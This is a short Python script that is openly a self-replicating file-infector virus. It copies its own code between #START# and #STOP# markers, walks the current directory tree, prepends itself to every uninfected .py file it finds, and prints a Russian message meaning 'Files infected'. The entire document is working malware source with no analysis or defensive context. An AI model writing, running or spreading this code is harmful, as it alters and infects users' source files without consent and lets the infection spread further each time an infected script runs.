#START#
import sys, os

def virus(file):
    begin = '#START#\n'; end = '#STOP#\n'
    with open(sys.argv[0], "r") as copy:
        k=0; virus_code = "\n"
        for line in copy:
            if line == begin: k = 1; virus_code += begin
            elif k == 1 and line != end: virus_code += line
            elif line == end: virus_code += end; break
            else: pass
    with open(file, "r") as f:
        native_code = ""
        for line in f:
            native_code += line
            if line == begin: Virus = True; break
            else: Virus = False
    if Virus == False:
        with open(file, "w") as paste:
            paste.write(virus_code + "\n\n" + native_code)
    else: pass
def res(void):
    print("Файлы заражены")
res(None)
def walk(dir):
    for name in os.listdir(dir):
        path = os.path.join(dir, name)
        if os.path.isfile(path):
            if os.path.splitext(path)[1] == '.py':
                virus(path)
            else: pass
        else: walk(path)
walk(os.getcwd())
#STOP#
